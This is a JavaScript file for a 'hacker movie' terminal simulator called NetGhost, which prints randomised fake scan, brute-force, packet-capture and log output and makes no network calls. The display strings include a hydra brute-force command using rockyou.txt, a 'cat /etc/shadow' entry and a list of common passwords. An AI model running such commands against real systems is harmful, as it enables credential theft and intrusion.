"use strict";
/* ============================================================================
   NetGhost · engine  (SIMULATION ONLY — no real network activity)
   Author: Apoji_Delegraphics
   ========================================================================== */

/* ---------- seeded RNG ---------- */
function mulberry32(a){return function(){a|=0;a=a+0x6D2B79F5|0;let t=Math.imul(a^a>>>15,1|a);t=t+Math.imul(t^t>>>7,61|t)^t;return((t^t>>>14)>>>0)/4294967296;};}
let SEED=(Math.random()*1e9)>>>0, rng=mulberry32(SEED);
const R={
  i:(a,b)=>Math.floor(rng()*(b-a+1))+a,
  pick:a=>a[Math.floor(rng()*a.length)],
  chance:p=>rng()<p,
  hex:n=>{let s="";for(let i=0;i<n;i++)s+="0123456789abcdef"[Math.floor(rng()*16)];return s;},
  shuffle:a=>{a=a.slice();for(let i=a.length-1;i>0;i--){const j=Math.floor(rng()*(i+1));[a[i],a[j]]=[a[j],a[i]];}return a;},
  wpick:list=>{let t=0;for(const o of list)t+=o.w;let r=rng()*t;for(const o of list){if((r-=o.w)<0)return o;}return list[0];}
};

/* ---------- ANSI truecolor ---------- */
const RGB={cyan:[57,194,214],amber:[232,163,61],red:[214,72,79],magenta:[197,111,176],
  blue:[77,143,214],yellow:[232,210,74],dim:[92,96,82],fg:[205,208,192],white:[240,240,230],green:[124,252,90]};
let PRI=[124,252,90]; // theme primary (mutable)
const A=(rgb,s)=>`\x1b[38;2;${rgb[0]};${rgb[1]};${rgb[2]}m${s}\x1b[0m`;
const pri=s=>A(PRI,s), dim=s=>A(RGB.dim,s), fg=s=>A(RGB.fg,s), wht=s=>A(RGB.white,s);
const cyan=s=>A(RGB.cyan,s), amber=s=>A(RGB.amber,s), red=s=>A(RGB.red,s), mag=s=>A(RGB.magenta,s), blue=s=>A(RGB.blue,s);
function pad(s,n){s=String(s);return s.length>=n?s:s+" ".repeat(n-s.length);}
function esc(s){return String(s).replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));}
function openPortCount(){return W.targets.reduce((a,t)=>a+t.ports.filter(p=>p.state==="open").length,0);}

/* ---------- themes ---------- */
const THEMES={
  green :{rgb:[124,252,90], vars:{'--primary':'#7CFC5A','--primary2':'#39b84a','--fg':'#cdd0c0'}},
  amber :{rgb:[232,163,61], vars:{'--primary':'#e8a33d','--primary2':'#9c6a1e','--fg':'#e6d8b8'}},
  cyan  :{rgb:[57,194,214], vars:{'--primary':'#39c2d6','--primary2':'#1d8294','--fg':'#c3d6d9'}},
  clash :{rgb:[197,111,176],vars:{'--primary':'#c56fb0','--primary2':'#7d3d6a','--fg':'#d6c7d0'}},
  mono  :{rgb:[200,200,190],vars:{'--primary':'#c8c8be','--primary2':'#8a8a80','--fg':'#cfcfc6'}}
};

/* ---------- data tables ---------- */
const REGIONS=["us-east","us-west","eu-central","eu-west","ap-south","ap-east","sa-east","af-south","me-central","nordic"];
const ROLES=["vault","edge","db","cache","gw","auth","mail","dns","build","ci","sftp","vpn","bastion","nfs","kube","etcd","redis","mq","log","idp","ldap","hsm","scada","plc"];
const ENVS=["internal","corp","prod","dmz","intra","svc","lan","mgmt","ops"];
const VENDORS=["OpenSSH 9.6","nginx 1.25.3","Apache 2.4.58","Postfix 3.8","MySQL 8.0.36","PostgreSQL 16.1","Redis 7.2.4","vsftpd 3.0.5","ProFTPD 1.3.8","Microsoft IIS 10.0","Dropbear 2022.83","lighttpd 1.4.74","Tomcat 10.1","Exim 4.97","Samba 4.19","MongoDB 7.0","Elasticsearch 8.12"];
const SERVICES={21:"ftp",22:"ssh",23:"telnet",25:"smtp",53:"domain",80:"http",110:"pop3",135:"msrpc",139:"netbios-ssn",143:"imap",389:"ldap",443:"https",445:"microsoft-ds",465:"smtps",502:"modbus",514:"syslog",587:"submission",631:"ipp",993:"imaps",995:"pop3s",1433:"ms-sql",1521:"oracle",2049:"nfs",2375:"docker",3306:"mysql",3389:"ms-wbt-server",5432:"postgresql",5601:"kibana",5672:"amqp",5900:"vnc",6379:"redis",8080:"http-proxy",8443:"https-alt",9092:"kafka",9200:"elasticsearch",11211:"memcache",27017:"mongod"};
const PORTLIST=Object.keys(SERVICES).map(Number);
const USERS=["root","admin","ubuntu","oracle","postgres","svc_backup","deploy","jenkins","www-data","administrator","operator","nagios","git","ftpuser","test","pi","ansible","sysadmin"];
const PWLIST=["123456","password","admin","root","toor","P@ssw0rd!","changeme","qwerty123","letmein","Welcome1","Summer2024!","hunter2","Passw0rd","admin123","000000","master","secret","Spring2025!","company@123"];
const SYSLOG_SRC=["kernel","systemd","sshd","cron","sudo","nginx","kubelet","dockerd","auditd","firewalld","named","postfix","chronyd"];
const CVES=["CVE-2024-3094","CVE-2023-4863","CVE-2024-6387","CVE-2023-38545","CVE-2024-21626","CVE-2023-44487","CVE-2024-23897","CVE-2022-0847","CVE-2021-44228","CVE-2024-1086"];
const COUNTRIES=[["US","US"],["NL","NL"],["DE","DE"],["SE","SE"],["SG","SG"],["JP","JP"],["BR","BR"],["ZA","ZA"],["IS","IS"],["RO","RO"],["CH","CH"],["CA","CA"]];
function randIP(){return `${R.i(11,223)}.${R.i(0,255)}.${R.i(0,255)}.${R.i(1,254)}`;}
function privIP(){return `10.${R.i(0,40)}.${R.i(0,255)}.${R.i(1,254)}`;}
function mac(){return Array.from({length:6},()=>R.hex(2)).join(":");}
function host(){return `${R.pick(ROLES)}-${R.pick(REGIONS)}-${R.i(1,9)}.${R.pick(ENVS)}`;}
const ts=()=>new Date().toTimeString().slice(0,8);
const tsU=()=>{const d=new Date();return d.toTimeString().slice(0,8)+"."+String(d.getMilliseconds()).padStart(3,"0")+R.i(100,999);};

/* ---------- world state ---------- */
const W={ghost:false,paused:false,streaming:false,director:false,mission:null,score:0,scene:"ghostnet",speed:"normal",density:"normal",
  targets:[],hops:[],threats:[],threatScore:0,queue:[],ppsAcc:0,pps:0,start:Date.now(),agents:[],
  res:{cpu:6,mem:22,net:4,disk:11,temp:41,fd:800,sock:120,hist:[]}};
const SESS=(R.hex(4)+"-"+R.hex(4)).toUpperCase();
/* cross-window sync: the main window is the source of SYS.LOAD; monitor pop-outs
   mirror it so every window shows identical load. */
const IS_MON=/monitor/.test(location.hash);
const LOAD_LS="netghost.sync.v1";
const WIN_ID=R.hex(8);           // this window's id, for counting open "ports" (windows)
const WINS={};                   // id -> lastSeen ms (heartbeats from every open window)
let BC=null; try{BC=new BroadcastChannel("netghost-sync");}catch(e){}
const USE_IPC=()=>!!(window.netghost&&window.netghost.sync);
/* three transports so load mirrors in Electron (IPC), browser popups (BroadcastChannel)
   and anywhere else (localStorage 'storage' events). */
function sendSync(m){
  if(USE_IPC()){ try{window.netghost.sync(m);}catch(e){} return; }
  if(BC){try{BC.postMessage(m);}catch(e){}}
  try{localStorage.setItem(LOAD_LS,JSON.stringify(Object.assign({_n:Date.now()+Math.random()},m)));}catch(e){}
}
function onSync(m){ if(!m)return;
  if(m.t==="hb"){ WINS[m.id]=Date.now(); return; }   // window heartbeat — all windows count these
  if(!IS_MON)return;                                  // the rest only mirrors into monitor pop-outs
  if(m.t==="res"){ W.res=m.res; renderMeters(); }
  else if(m.t==="pps"){ const e=document.getElementById("s-pps"); if(e)e.textContent=Number(m.v).toLocaleString(); }
  else if(m.t==="agent"&&m.entry){ W.agents.unshift(m.entry); W.agents=W.agents.slice(0,30); renderAgents(); }
  else if(m.t==="closewin"){ if(m.id===WIN_ID){ try{window.close();}catch(e){} } }
}
if(BC)BC.onmessage=e=>onSync(e.data||{});
if(window.netghost&&window.netghost.onSync)window.netghost.onSync(onSync);
addEventListener("storage",e=>{ if(e.key===LOAD_LS&&e.newValue){ try{onSync(JSON.parse(e.newValue));}catch(_){} } });
const DMUL={sparse:.6,normal:1,dense:1.7};
const SPEEDS={slow:{g:950,a:2200},normal:{g:520,a:1400},fast:{g:300,a:800},overdrive:{g:150,a:420}};
function dn(a,b){return R.i(Math.max(1,Math.round(a*DMUL[W.density])),Math.round(b*DMUL[W.density]));}

/* ============================================================================
   XTERM terminal + interactive line editor
   ========================================================================== */
const term=new Terminal({
  fontFamily:'"VT323","Share Tech Mono",monospace',
  fontSize:17, lineHeight:1.0, letterSpacing:0, cursorBlink:true, cursorStyle:"block",
  scrollback:2000, allowTransparency:true, convertEol:false,
  theme:{background:"#07070a",foreground:"#cdd0c0",cursor:"#7CFC5A",cursorAccent:"#07070a",
    selectionBackground:"#2a3d22",black:"#0b0b0e",brightBlack:"#5c6052"}
});
const fit=new FitAddon.FitAddon();term.loadAddon(fit);
term.open(document.getElementById("termhost"));
try{fit.fit();}catch(e){}
addEventListener("resize",()=>{try{fit.fit();}catch(e){}});

const PROMPT=()=>pri("ghost")+dim("@")+cyan("netghost")+dim(":~$ ");
let buf="", hist=[], hidx=-1, atPrompt=false;
function drawPrompt(){term.write("\r\x1b[2K"+PROMPT()+buf);}
/* write a block of output without destroying what the user is typing */
function wl(str){
  if(atPrompt)term.write("\r\x1b[2K");
  String(str).split("\n").forEach(l=>term.write(l+"\r\n"));
  if(atPrompt)drawPrompt();
}
function startPrompt(){atPrompt=true;drawPrompt();}
term.onData(d=>{
  if(d==="\x1b[A"){ if(hist.length){hidx=Math.max(0,hidx-1);buf=hist[hidx]||"";drawPrompt();} return;}
  if(d==="\x1b[B"){ if(hist.length){hidx=Math.min(hist.length,hidx+1);buf=hist[hidx]||"";drawPrompt();} return;}
  if(d==="\x1b[C"||d==="\x1b[D")return;
  for(const ch of d){
    if(ch==="\r"){ term.write("\r\n"); const line=buf; buf=""; if(line.trim()){hist.push(line);hidx=hist.length;} atPrompt=false; runCmd(line); startPrompt(); }
    else if(ch==="\x7f"){ if(buf){buf=buf.slice(0,-1);term.write("\b \b");} }
    else if(ch==="\x03"){ term.write("^C\r\n"); buf=""; startPrompt(); }
    else if(ch==="\x0c"){ term.clear(); buf=""; startPrompt(); }
    else if(ch>=" "){ buf+=ch; term.write(ch); }
  }
});
document.getElementById("termhost").addEventListener("mousedown",()=>setTimeout(()=>term.focus(),0));
const inTerm=()=>document.activeElement&&document.activeElement.classList&&document.activeElement.classList.contains("xterm-helper-textarea");
/* in-terminal chords that don't collide with typing letters into commands */
term.attachCustomKeyEventHandler(e=>{
  if(e.type!=="keydown")return true;
  if(e.ctrlKey&&e.shiftKey&&(e.key==="G"||e.key==="g")){toggleGhost();return false;}
  if(e.ctrlKey&&e.shiftKey&&(e.key==="F"||e.key==="f")){goFull();return false;}
  if(e.key==="Escape"){
    if(mCan){stopMatrix();return false;}
    if(document.getElementById("popwrap").classList.contains("show"))closePop();
    else if(document.getElementById("mapwrap").classList.contains("show"))closeMap();
    else if(document.getElementById("pkgwrap").classList.contains("show"))closePkg();
    else if(document.getElementById("cfgwrap").classList.contains("show"))closeCfg();
    else openCfg();
    return false;
  }
  return true;
});

/* ============================================================================
   SIDEBARS
   ========================================================================== */
function makeTarget(){
  const t={ip:privIP(),host:host(),state:"up",os:R.pick(["Linux 6.x","Linux 5.x","Windows Server 2022","Windows Server 2019","FreeBSD 14","VMware ESXi 8"]),ports:[],breached:false};
  const chosen=R.shuffle(PORTLIST).slice(0,R.i(2,6)).sort((a,b)=>a-b);
  t.ports=chosen.map(p=>({p,svc:SERVICES[p],ver:R.pick(VENDORS),state:R.chance(.82)?"open":(R.chance(.5)?"filtered":"closed")}));
  return t;
}
function ensureTargets(n){while(W.targets.length<n)W.targets.push(makeTarget());}
function renderTopo(){
  const el=document.getElementById("topo");
  el.innerHTML=W.targets.slice(-16).map(t=>{
    const c=t.breached?"breach":t.state==="scan"?"scan":t.state==="down"?"down":"up";
    const tg=t.breached?"BREACH":t.state==="scan"?"SCAN":`${t.ports.filter(p=>p.state==="open").length}▸`;
    return `<div class="node" title="${t.ip}"><span class="nst ${c}"></span><span class="nm">${t.host}</span><span class="tg">${tg}</span></div>`;
  }).join("");
  document.getElementById("topoct").textContent=W.targets.length;
  document.getElementById("s-tgt").textContent=W.targets.length;
  const sv=document.getElementById("s-svc"); if(sv)sv.textContent=openPortCount();
}
function rebuildHops(){
  W.hops=[];const n=R.i(4,8);
  for(let i=0;i<n;i++){const c=R.pick(COUNTRIES);W.hops.push({ip:randIP(),ms:R.i(3,180),cc:c[0],node:`${R.pick(["tor","wg","relay","vps","exit","mix"])}${R.i(1,99)}`});}
  renderHops(-1);
}
function renderHops(active){
  document.getElementById("hops").innerHTML=W.hops.map((h,i)=>
    `<div class="hop ${i===active?'on':''}"><span class="fl">${h.cc}</span><span class="ip">${h.ip}</span><span class="nd">${h.node}</span><span class="ms">${h.ms}ms</span></div>`).join("");
  document.getElementById("hopct").textContent=W.hops.length;
}
function pushThreat(sev,txt){
  W.threats.unshift({sev,txt,t:new Date()});W.threats=W.threats.slice(0,40);
  const prev=W.threatScore;
  W.threatScore=Math.min(100,prev+(sev==="crit"?18:sev==="high"?10:sev==="med"?5:2));
  renderThreat();
  if(typeof agentEvent==="function"){
    if(sev==="crit") agentEvent("breach — "+txt);
    else if(W.threatScore>70 && prev<=70) agentEvent("threat level now CRITICAL");
  }
}
function renderThreat(){
  document.getElementById("threat").innerHTML=W.threats.slice(0,20).map(t=>
    `<div class="thr"><span class="tt">${t.t.toTimeString().slice(0,8)}</span><span class="sev-${t.sev}">${t.txt}</span></div>`).join("");
  const s=W.threatScore,lvl=s>70?"CRITICAL":s>45?"HIGH":s>20?"ELEVATED":"LOW";
  const col=s>70?"var(--red)":s>45?"var(--amber)":s>20?"var(--magenta)":"var(--primary)";
  ["thrlvl","s-threat"].forEach(id=>{const e=document.getElementById(id);e.textContent=lvl;e.style.color=col;});
}
function renderMeters(){
  const r=W.res, blocks=v=>{const n=20,on=Math.round(v/100*n);let s="";for(let i=0;i<n;i++)s+=`<i style="opacity:${i<on?1:.12}"></i>`;return s;};
  const m=(l,v,u,cls)=>`<div class="meter"><div class="ml"><span>${l}</span><b>${Math.round(v)}${u}</b></div><div class="bar ${cls||''}">${blocks(Math.min(100,v))}</div></div>`;
  document.getElementById("meters").innerHTML=
    m("CPU · GHOST-CORE",r.cpu,"%",r.cpu>80?"crit":r.cpu>55?"hot":"")+
    m("MEMORY",r.mem,"%",r.mem>85?"hot":"")+
    m("NET I/O",r.net,"%",r.net>88?"hot":"")+
    m("DISK",r.disk,"%","")+
    m("CORE TEMP",r.temp,"°",r.temp>78?"crit":r.temp>65?"hot":"")+
    `<div class="gauge">THRPUT ${(r.net*12.4).toFixed(1)} Mb/s<br>FD ${Math.round(r.fd)}  SOCK ${Math.round(r.sock)}  TASK ${W.queue.length}</div>`;
  document.getElementById("s-load").textContent=W.ghost?"ACTIVE":r.cpu>50?"busy":"idle";
}
function tickRes(){
  if(IS_MON)return; // monitor windows receive SYS.LOAD via sync, don't compute their own
  const r=W.res, hi=W.ghost||W.scene==="ddos",
    tg=hi?{cpu:R.i(45,96),mem:R.i(40,88),net:R.i(50,99),temp:R.i(58,82)}:{cpu:R.i(3,18),mem:R.i(18,34),net:R.i(2,20),temp:R.i(38,48)};
  r.cpu+=(tg.cpu-r.cpu)*.25;r.mem+=(tg.mem-r.mem)*.12;r.net+=(tg.net-r.net)*.4;r.temp+=(tg.temp-r.temp)*.08;
  r.disk=Math.min(99,r.disk+(hi?rng()*.4:rng()*.02));
  r.fd=Math.max(80,r.fd+(hi?R.i(-40,120):R.i(-30,30)));
  r.sock=Math.max(10,r.sock+(hi?R.i(-20,60):R.i(-15,15)));
  renderMeters();
  sendSync({t:"res",res:W.res});
}

/* ============================================================================
   STREAM GENERATORS
   ========================================================================== */
const GEN={
  nmap(t){ t=t||R.pick(W.targets); if(!t)return; t.state="scan";renderTopo();
    wl(dim("$ ")+wht(`nmap -sS -sV -T4 -Pn ${t.ip}`));
    wl(dim(`Starting Nmap 7.95 ( https://nmap.org ) at ${ts()}`));
    wl(blue(`Nmap scan report for ${t.host} (${t.ip})`));
    wl(dim(`Host is up (0.00${R.i(10,99)}s latency).`));
    wl(dim("PORT       STATE    SERVICE        VERSION"));
    let open=0;
    t.ports.slice().sort((a,b)=>a.p-b.p).forEach(p=>{
      if(p.state==="open")open++;
      const st=p.state==="open"?pri(pad("open",9)):p.state==="filtered"?amber(pad("filtered",9)):dim(pad("closed",9));
      wl(dim(pad(p.p+"/tcp",11))+st+wht(pad(p.svc,15))+dim(p.state==="open"?p.ver:""));
    });
    wl(dim(`MAC Address: ${mac()} (${R.pick(["Dell","Supermicro","VMware","Cisco","HPE"])})`));
    if(open&&R.chance(.5)){const v=R.pick(CVES);wl(dim("|_ ")+amber(`vuln: ${v} may be exploitable`));pushThreat("high",`${v} · ${t.host}`);}
    wl(dim(`Nmap done: 1 host up, scanned in ${(rng()*6+1).toFixed(2)}s`)); wl("");
    t.state="up";renderTopo();
  },
  hydra(t){ t=t||R.pick(W.targets); if(!t)return;
    const svc=R.pick(["ssh","ftp","rdp","mysql","postgres"]);
    wl(dim("$ ")+wht(`hydra -L users.lst -P rockyou.txt -t 16 ${svc}://${t.ip}`));
    wl(dim(`Hydra v9.5 starting at ${ts()}`));
    wl(dim(`[DATA] 16 tasks, ${R.i(14000,9000000).toLocaleString()} login tries`));
    let cracked=false;
    for(let i=0;i<dn(4,8);i++){ const u=R.pick(USERS),p=R.pick(PWLIST);
      if(!cracked&&R.chance(.17)){
        wl(dim(`[${svc}] `)+pri(`host: ${t.ip}  login: ${u}  password: ${p}`));
        wl(pri("[+] ")+red(`VALID CREDENTIAL PAIR RECOVERED → ${u}:${p}`));
        cracked=true;t.breached=true;renderTopo();pushThreat("crit",`creds cracked ${u}@${t.host}`);
      } else wl(dim(`[ATTEMPT] ${t.ip}  "${u}":"${p}"  ${R.i(1,16)}/${R.i(16,999999)}`));
    }
    if(!cracked)wl(dim(`[STATUS] ${R.i(200,9000)}.0 tries/min, retrying…`)); wl("");
  },
  tcpdump(){ const a=privIP(),b=R.chance(.5)?privIP():randIP();
    wl(dim("$ ")+wht(`tcpdump -i eth0 -nnXS host ${a}`));
    wl(blue(`${tsU()} IP ${a}.${R.i(1024,65535)} > ${b}.${R.pick([443,80,22,53,8443])}: ${R.pick(["Flags [S]","Flags [S.]","Flags [P.]","Flags [.]","Flags [F.]","Flags [R.]"])}, seq ${R.i(1,4e9)}, win ${R.i(1000,65535)}, length ${R.i(0,1460)}`));
    for(let r=0;r<dn(2,5);r++){ const off=(r*16).toString(16).padStart(4,"0"); let h=[],asc="";
      for(let i=0;i<16;i++){const by=R.i(0,255);h.push(by.toString(16).padStart(2,"0"));asc+=(by>=32&&by<127)?String.fromCharCode(by):".";}
      wl(dim(`\t0x${off}:  `)+dim(h.join(" "))+cyan("  "+asc));
    }
    W.ppsAcc+=R.i(1,6);
  },
  syslog(){ const src=R.pick(SYSLOG_SRC),h=R.pick(ROLES)+"-"+R.pick(REGIONS);
    const pool={
      sshd:[`Accepted publickey for ${R.pick(USERS)} from ${randIP()} port ${R.i(1024,65535)} ssh2`,`Failed password for invalid user ${R.pick(USERS)} from ${randIP()}`,`Disconnected from user ${R.pick(USERS)} ${randIP()} [preauth]`],
      kernel:[`TCP: Possible SYN flooding on port ${R.pick([80,443,22])}. Sending cookies.`,`audit: type=1400 apparmor="DENIED" operation="open"`,`eth0: link up, 10000 Mbps, full duplex`],
      sudo:[`${R.pick(USERS)} : TTY=pts/${R.i(0,5)} ; USER=root ; COMMAND=/usr/bin/${R.pick(["cat /etc/shadow","tar czf bak.tgz /var","systemctl restart nginx"])}`],
      firewalld:[`DROP IN=eth0 SRC=${randIP()} DST=${privIP()} PROTO=TCP DPT=${R.pick(PORTLIST)}`],
      auditd:[`USER_AUTH pid=${R.i(100,9999)} uid=0 acct="${R.pick(USERS)}" res=${R.chance(.5)?"success":"failed"}`],
      kubelet:[`"Successfully pulled image" pod="ns/${R.pick(ROLES)}-${R.hex(4)}"`]
    }[src]||[`service ${src} reloaded`,`started session ${R.i(1,9999)} of ${R.pick(USERS)}`];
    const msg=R.pick(pool), bad=/Failed|DENIED|DROP|flood|failed/.test(msg), good=/Accepted|success|up|pulled/.test(msg);
    wl(dim(`${ts()} ${h} `)+blue(`${src}[${R.i(100,9999)}]: `)+(bad?amber(msg):good?pri(msg):dim(msg)));
    if(bad&&R.chance(.3))pushThreat("med",`${src}: ${msg.slice(0,30)}…`);
    W.ppsAcc+=1;
  },
  ping(ip){ ip=ip||privIP();
    wl(dim("$ ")+wht(`ping -c4 ${ip}`));
    for(let i=0;i<4;i++)wl(dim(`64 bytes from ${ip}: icmp_seq=${i+1} ttl=${R.i(48,64)} time=${(rng()*40+.3).toFixed(1)} ms`));
    wl(pri("4 packets transmitted, 4 received, 0% packet loss")); wl("");
  },
  trace(ip){ ip=ip||randIP(); rebuildHops();
    wl(dim("$ ")+wht(`traceroute -n ${ip}`));
    W.hops.forEach((h,i)=>wl(dim(` ${pad(i+1,2)}  `)+blue(pad(h.ip,16))+dim(`  ${h.cc}  `)+pri(`${h.ms}.${R.i(100,999)} ms`)));
    wl(dim(` ${W.hops.length+1}  `)+wht(pad(ip,16))+pri("  ◂ target reached")); wl("");
  },
  synflood(){ const tgt=privIP();
    wl(dim("$ ")+wht(`mitigate --scrub ${tgt}`));
    for(let i=0;i<dn(3,6);i++)wl(amber(`[SYN-FLOOD] ${R.i(2000,90000).toLocaleString()} pps from spoofed ${randIP()}/${R.i(16,28)} → ${tgt}:${R.pick([80,443])}`));
    wl(pri(`[SCRUB] rate-limit applied · ${R.i(60,99)}% malicious traffic dropped at edge`));
    pushThreat(R.chance(.4)?"crit":"high",`volumetric DDoS on ${tgt}`); wl("");
  },
  privesc(t){ t=t||R.pick(W.targets.filter(x=>x.breached))||R.pick(W.targets); if(!t)return;
    wl(dim("$ ")+wht(`ssh ${R.pick(USERS)}@${t.ip} 'id; uname -a'`));
    wl(dim(`uid=0(root) gid=0(root) groups=0(root)`));
    wl(dim(`Linux ${t.host} 6.5.0-generic #1 SMP x86_64 GNU/Linux`));
    wl(pri("[+] ")+red(`root shell established on ${t.host}`));
    t.breached=true;renderTopo();pushThreat("crit",`root on ${t.host}`); wl("");
  }
};

/* ============================================================================
   SCENES
   ========================================================================== */
const SCENES={
  ghostnet:{name:"GHOSTNET",desc:"Full-spectrum ambient operation — recon, breaches, capture, logs AND every installed plugin, cycling endlessly. The default drift-and-hum mode.",
    ops:[{fn:opRecon,w:3},{fn:opCred,w:2},{fn:opPivot,w:1},{fn:opWatch,w:3},{fn:opLogs,w:3}]},
  recon:{name:"RECON SWEEP",desc:"Quiet enumeration. Pings, service sweeps and route tracing across a widening target map. Low noise, no breaches.",
    ops:[{fn:opRecon,w:5},{fn:opPivot,w:2},{fn:()=>{for(let i=0;i<dn(2,4);i++)q(GEN.syslog);},w:2}]},
  redteam:{name:"RED-TEAM BREACH",desc:"Aggressive offensive chain — scan, brute-force, crack, escalate to root, exfiltrate. Threat level climbs fast.",
    ops:[{fn:opRecon,w:2},{fn:opCred,w:4},{fn:opBreach,w:4},{fn:opWatch,w:1}]},
  ddos:{name:"DDoS MITIGATION",desc:"Defensive scrubbing console. Volumetric floods, firewall DROP storms and edge rate-limiting under sustained load.",
    ops:[{fn:()=>{q(GEN.synflood);},w:5},{fn:()=>{for(let i=0;i<dn(4,8);i++)q(GEN.syslog);},w:3},{fn:opWatch,w:3}]},
  soc:{name:"SOC MONITOR",desc:"Blue-team watch floor. Steady syslog, auth events and the occasional alert worth a second look. Calm, continuous.",
    ops:[{fn:()=>{for(let i=0;i<dn(5,9);i++)q(GEN.syslog);},w:5},{fn:opRecon,w:1},{fn:opWatch,w:2}]}
};
function q(fn,arg){W.queue.push(()=>fn(arg));}
function opRecon(){ const t=makeTarget();W.targets.push(t);renderTopo();
  q(()=>wl(mag("◆ OP ")+wht("RECON-SWEEP")+dim(` — ${t.host}`)));q(()=>GEN.ping(t.ip));q(()=>GEN.nmap(t)); }
function opCred(){ const t=R.pick(W.targets); q(()=>wl(mag("◆ OP ")+wht("CRED-AUDIT")+dim(` — ${t?t.host:'…'}`)));q(()=>GEN.hydra(t)); }
function opBreach(){ const t=R.pick(W.targets)||makeTarget(); q(()=>wl(mag("◆ OP ")+wht("BREACH-CHAIN")+dim(` — ${t.host}`)));q(()=>GEN.hydra(t));q(()=>GEN.privesc(t)); }
function opPivot(){ q(()=>wl(mag("◆ OP ")+wht("PIVOT")+dim(" — rotating proxy chain")));q(()=>GEN.trace(randIP())); }
function opWatch(){ q(()=>wl(mag("◆ OP ")+wht("PACKET-WATCH")+dim(" — passive capture")));for(let i=0;i<dn(3,6);i++)q(GEN.tcpdump); }
function opLogs(){ q(()=>wl(mag("◆ OP ")+wht("LOG-HARVEST")+dim(" — tailing aggregator")));for(let i=0;i<dn(5,9);i++)q(GEN.syslog); }

function setScene(id,silent){
  W.scene=id;const s=SCENES[id];
  document.getElementById("s-scene").textContent=s.name;
  document.getElementById("mhead-scene").textContent=s.name;
  document.getElementById("scenedesc").textContent=s.desc;
  W.queue=[];
  if(!silent){wl("");wl(mag("══ SCENE → ")+wht(s.name)+mag(" ══"));wl(dim("   "+s.desc));wl("");}
}

/* ============================================================================
   CLOCKS
   ========================================================================== */
let cU,cR,cP,cA,cG,cPlug,cAgent,cHB,cDir,cMission;
function startClocks(){
  stopClocks();const sp=SPEEDS[W.speed];
  cU=setInterval(()=>{const s=Math.floor((Date.now()-W.start)/1000);document.getElementById("s-up").textContent=[s/3600,s/60%60,s%60].map(x=>String(Math.floor(x)).padStart(2,"0")).join(":");},1000);
  cR=setInterval(tickRes,900);
  cP=setInterval(()=>{ if(IS_MON)return; W.pps=W.ppsAcc;W.ppsAcc=0;
    const v=(W.ghost||W.scene==="ddos"?R.i(800,24000):W.pps);
    document.getElementById("s-pps").textContent=v.toLocaleString(); sendSync({t:"pps",v}); },1000);
  cA=setInterval(ambient,sp.a);
  cG=setInterval(ghostTick,sp.g);
  cPlug=setInterval(pluginBurst,60000); // fire a few installed plugins every minute
  cAgent=setInterval(()=>{ if(IS_MON||W.paused||!active())return; aiAgent(undefined,true); },50000); // auto agent report while running (AI rate-limited 2/hr)
  cHB=setInterval(()=>{   // heartbeat: announce this window + count how many "ports" (windows) are open
    WINS[WIN_ID]=Date.now(); sendSync({t:"hb",id:WIN_ID});
    const now=Date.now(); for(const k in WINS) if(now-WINS[k]>6000) delete WINS[k];
    const e=document.getElementById("s-ports"); if(e)e.textContent=Object.keys(WINS).length;
  },2000);
  cDir=setInterval(directorTick,90000);    // scene director rotates scenes every 90s when on
  cMission=setInterval(missionTick,4000);  // mission progress checker
}
function stopClocks(){[cU,cR,cP,cA,cG,cPlug,cAgent,cHB,cDir,cMission].forEach(clearInterval);}
function active(){ return W.ghost||W.streaming; }   // is the stream running?
function ambient(){ if(W.paused||!active())return;
  if(W.queue.length){ try{W.queue.shift()();}catch(e){} if(W.queue.length&&R.chance(.6)){try{W.queue.shift()();}catch(e){}} return; }
  if(W.ghost)return;
  if(R.chance(.5))GEN.syslog(); if(R.chance(.3))GEN.tcpdump();
}
/* every minute, visibly run a couple of installed plugins (scene-bearing ones) */
function pluginBurst(){
  if(W.paused||IS_MON||!active())return;
  const ids=Object.keys(ENABLED).filter(id=>ENABLED[id].scenes&&Object.keys(ENABLED[id].scenes).length&&!W.sweepExclude.includes(id));
  if(!ids.length)return;
  const pick=R.shuffle(ids).slice(0,R.i(2,3));
  wl("");wl(mag("◆ PLUGIN SWEEP ")+dim("— running "+pick.join(", ")));
  pick.forEach(id=>{ const sc=ENABLED[id].scenes, ks=Object.keys(sc); const ops=(sc[R.pick(ks)].ops)||[];
    if(ops.length)try{R.wpick(ops).fn();}catch(e){} });
}
/* ops Auto-Ghost draws from: the current scene, plus (in 'ghostnet') every
   installed plugin's scene ops, so plugins join the endless rotation. */
function ghostOps(){
  let ops=(SCENES[W.scene]&&SCENES[W.scene].ops)||[];
  if(W.scene==="ghostnet"&&W.pluginsAuto!==false){
    ops=ops.slice();
    for(const id in ENABLED){ const sc=ENABLED[id].scenes||{};
      for(const k in sc)(sc[k].ops||[]).forEach(o=>ops.push({fn:o.fn,w:o.w||2})); }
  }
  return ops.length?ops:[{fn:()=>{},w:1}];
}
function ghostTick(){ if(!W.ghost||W.paused)return;
  if(W.queue.length===0){try{R.wpick(ghostOps()).fn();}catch(e){}}
  else{try{W.queue.shift()();}catch(e){}}
}

/* ----- scene director: auto-rotate scenes/themes on a timer ----- */
function directorTick(){
  if(IS_MON||W.paused||!W.director||!active())return;
  const list=Object.keys(SCENES); let next=W.scene;
  for(let i=0;i<8&&next===W.scene;i++) next=R.pick(list);
  setScene(next,true);
  document.getElementById("s-scene").textContent=SCENES[W.scene].name;
  document.getElementById("mhead-scene").textContent=SCENES[W.scene].name;
  if(R.chance(.4)) applyTheme(R.pick(Object.keys(THEMES)));
  wl("");wl(cyan("▷ DIRECTOR ")+dim("→ scene ")+wht(SCENES[W.scene].name));wl("");
}
/* ----- missions: optional objectives + score ----- */
const MISSIONS=[
  {name:"RECON",   goal:"discover 12 hosts",         target:12, pts:100, metric:()=>W.targets.length},
  {name:"SURFACE", goal:"map 40 open services",       target:40, pts:150, metric:()=>openPortCount()},
  {name:"BREACH",  goal:"breach 3 hosts",             target:3,  pts:250, metric:()=>W.targets.filter(t=>t.breached).length},
  {name:"HEAT",    goal:"drive threat index to 80",   target:80, pts:200, metric:()=>W.threatScore},
  {name:"SWARM",   goal:"open 3 ports (windows)",     target:3,  pts:120, metric:()=>Object.keys(WINS).length}
];
function startMission(i){
  W.mission=Object.assign({},MISSIONS[i%MISSIONS.length],{idx:i%MISSIONS.length,half:false});
  wl("");wl(amber("▣ MISSION ")+wht(W.mission.name)+dim(" — "+W.mission.goal)+dim("  ·  +"+W.mission.pts+" pts"));wl("");
}
